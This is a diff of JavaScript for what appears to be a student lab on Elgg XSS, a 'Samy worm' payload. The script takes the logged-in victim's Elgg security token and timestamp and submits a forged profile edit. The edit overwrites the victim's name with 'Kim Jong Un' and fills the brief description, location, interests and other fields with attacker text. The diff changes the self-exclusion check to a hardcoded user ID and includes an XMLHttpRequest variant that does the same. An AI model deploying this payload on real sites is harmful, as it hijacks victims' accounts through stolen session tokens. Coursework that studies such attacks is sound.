@@ -6,14 +6,15 @@
         var guid = elgg.session.user.guid;
 
         var sendurl = "/action/profile/edit";
+        var myID = 59; // User ID of Samy
 
         // If the user is Samy, then the attack is not performed
-        if (name == "Samy") return;
+        if (guid == myID) return;
 
         var formData = new FormData();
         formData.append('__elgg_token', token);
         formData.append('__elgg_ts', ts);
-        formData.append('name', name);
+        formData.append('name', "Kim Jong Un");
         formData.append('description', '1905001');
         formData.append('accesslevel[description]', '1');
         formData.append('briefdescription', 'I am Samy, the worm. Catch me if you can.');
@@ -43,18 +44,17 @@
     }
 </script>
 
-
-
-/* <script type="text/javascript">
+/*
+<script type="text/javascript">
 	window.onload = function() {
-	    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-	    var token="&__elgg_token="+elgg.security.token.__elgg_token;
-	    var name=elgg.session.user.name;
+	    var ts=elgg.security.token.__elgg_ts;
+	    var token=elgg.security.token.__elgg_token;
+	    var userName=elgg.session.user.name;
 	    var guid=elgg.session.user.guid;
         var sendurl='/action/profile/edit';
-	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=${name}&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
-	
-        if(name!="Samy")
+	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=Kim Jong Un&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
+        
+        if(guid != 59)
         {
             var Ajax=null;
             Ajax=new XMLHttpRequest();
@@ -65,5 +65,5 @@
             Ajax.send(content);
         }
 	}
-</script> */
-
+</script>
+*/
